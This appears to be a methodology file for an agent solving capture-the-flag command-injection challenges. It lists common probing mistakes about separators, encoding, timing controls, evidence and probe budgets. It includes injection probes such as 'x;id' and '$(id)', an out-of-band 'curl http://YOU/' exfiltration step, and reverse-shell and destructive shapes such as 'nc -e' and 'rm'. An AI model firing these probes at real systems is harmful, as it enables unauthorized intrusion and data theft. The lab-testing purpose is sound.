# Common Mistakes — the things that waste probes

## 1. Claiming exec from a reflected payload

`x;id` reflected back literally is NOT exec — the response shows the
input. Only `uid=`/`gid=`/`root`/`nt authority`/output-that-isn't-input
proves a command ran. Reflection is a candidate, not evidence.

## 2. Treating an `argv`-form sink as shell-injectable

`execFile('ping',[x])`/`subprocess.run(['ping',x])`/`ProcessBuilder('ping',x)`
have NO shell — `;id` becomes the literal hostname `x;id` →
`ping: x;id: Name or service not known` — that error LOOKS like the
shell ran; it means the ARGV passed whole. The live class is
`argument-injection.md`, not shell-cmdi. Confirm by sending a second
command and looking for `not found` on the WHOLE arg.

## 3. Confusing `eval`/`exec` language-level with `sh -c` shell

`eval($_GET['x'])` evaluates PHP code — `system('id')` is the payload,
not `;id`. A `;id` sent to PHP-eval is a PHP syntax error, not a shell
command. Fingerprint first: `phpversion()`/`7*7`/`'a'.'b'` —
`eval-injection.md`.

## 4. Forgetting the URL-encoding

`x;id` in a `?host=` query — `;` is a valid URL char but `id` needs no
encode — `&` DOES break it (`x&id` → two params). Always
`--data-urlencode`/`%26`/`%3B` — `waf-bypass.md`'s encoding table.

## 5. Using the wrong separator for the shell

- `;` is POSIX-only — `x;whoami` on Windows is `x` then a syntax error
- `&`/`&&`/`||`/`|` cross both — send those when the shell is unknown
- `` ` ``/`$()` are POSIX+PS — cmd doesn't do them
- `%VAR%`/`^`/`&` are cmd-side

## 6. Over-probing the same class

5 probes / 15 min per mechanism class — `AGENTS.md`. If `;id`
and `|id` and `$(id)` all fail, the class is likely dead — park it and
switch layer, don't try a 6th separator.

## 7. Calling a timing-delay "proof" without a control

`sleep 5` delayed 5s — is that the probe or the server's normal
latency? Run a control: `x;true`/`x;sleep 0` — the DELTA is the signal,
not the absolute time. `blind-cmdi.md`'s two-point measurement.

## 8. Exfiltrating before confirming the channel

`curl http://YOU/` from a target that can't reach you → silence — but
the silence isn't proof the class is dead. Test the channel first —
`ping -c1 x.YOU`/`nslookup`/`curl --connect-timeout` — one probe to
prove egress, THEN the exfil.

## 9. Payloads that write/destroy as the first probe

`echo x>/tmp/o` / `rm` / `mkfifo` / `nc -e` — write-shaped probes
violate the loop's read-first rule. `hooks.py pre-probe` refuses them.
Order: read (id/cat) → blind-confirm (sleep) → OOB → write ONLY when
exec is confirmed and read won't do.

## 10. Not recording the falsifier result

Every probe that fails tells you WHICH constraint applies — `;` blocked
vs `id` blocked vs shell absent. Record which probe failed and why —
`error-analysis.md` — not just "it didn't work".

## 11. Ignoring the response-fragment boundary

`uid=33` inside HTML/CSS/JS context is fine — `uid=33` inside a
redirect Location header is the post-probe-redirect shape. Read the
response's structure, not just whether the bytes appear.

## 12. Trusting a tool that wasn't run

`cmdi_probe`/`http_probe`/`sanitizer_fuzz`/`commix` — a claim must be
traceable to a command that actually ran. "The tool would show..." is
not evidence. Run it, quote the response, feed `--response` to hooks.

## 13. Restarting the hunt per request

The shell, the separators, the filter — they persist across probes.
Build the constraint map once (`detection.md`), then run the bypass
ladder — don't re-discover the separator every probe.

## 14. Missing the ssti/eval boundary

`{{7*7}}` evaluating isn't cmdi — it's `web-ssti`. `#{7*7}`/`${7*7}`/
eval-`7*7` is eval-injection → here. The boundary decision is in
`ssti-vs-cmdi.md`.

## 15. Forgetting the flag could be elsewhere

`cat /flag` works but the flag isn't there → `find/-name/env/config`
hunt — `chains.md`'s flag-location list — before assuming the class is
dead.

## The mistakes-checklist before every probe

```
□ is the encoding right?           — --data-urlencode / %XX
□ is the separator right for the shell? — fingerprint first
□ is this read-only?               — no write as first probe
□ does the response actually contain command OUTPUT? — not reflection
□ did I record which constraint the last probe hit?
□ is there a control for a timing/negative result?
□ am I inside my budget?           — 5/class, 25/challenge
```

## Output to record

- which mistake a probe saved you from + the corrected probe
